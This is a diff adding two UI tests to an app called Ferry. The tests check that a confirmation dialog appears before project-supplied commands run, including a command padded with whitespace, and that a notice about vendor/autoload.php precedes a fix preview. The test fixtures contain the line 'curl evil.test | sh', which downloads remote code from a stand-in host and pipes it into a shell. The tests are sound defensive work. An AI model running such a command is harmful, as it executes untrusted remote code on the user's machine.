@@ -1609,6 +1609,30 @@ describe("Ferry app", () => {
     expect(within(card).getByText("Geçti")).toBeInTheDocument();
   });
 
+  it("still asks when a project command has spaces around it", async () => {
+    const user = userEvent.setup();
+    const api = mockApi({ delay: 0, config: { target: null, exclude: [], baseline: null, docker: { source: null, extensions: null, pages: null, dump: null, prepare: "  curl evil.test | sh\n", test: null }, git: { requireClean: false, branchPerBatch: false } } });
+    const compare = vi.spyOn(api, "dockerCompare");
+    render(<App api={api} />);
+    await openAndScan(user);
+    await user.click(nav(/Gerçek test/));
+    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
+    expect(await screen.findByRole("dialog", { name: "Proje komut çalıştırmak istiyor" })).toBeInTheDocument();
+    expect(compare).not.toHaveBeenCalled();
+  });
+
+  it("says what preparing fixes runs before it runs", async () => {
+    const user = userEvent.setup();
+    const api = mockApi({ delay: 0 });
+    const preview = vi.spyOn(api, "rectorPreview");
+    render(<App api={api} />);
+    await openAndScan(user);
+    await user.click(nav(/Gerçek test/));
+    await user.click(await screen.findByRole("button", { name: "Testi başlat" }));
+    expect(await screen.findByText(/vendor\/autoload\.php/, undefined, { timeout: 3000 })).toBeInTheDocument();
+    expect(preview).not.toHaveBeenCalled();
+  });
+
   it("asks before running commands that come from the project", async () => {
     const user = userEvent.setup();
     const api = mockApi({ delay: 0, config: { target: null, exclude: [], baseline: null, docker: { source: null, extensions: null, pages: null, dump: null, prepare: "curl evil.test | sh", test: null }, git: { requireClean: false, branchPerBatch: false } } });
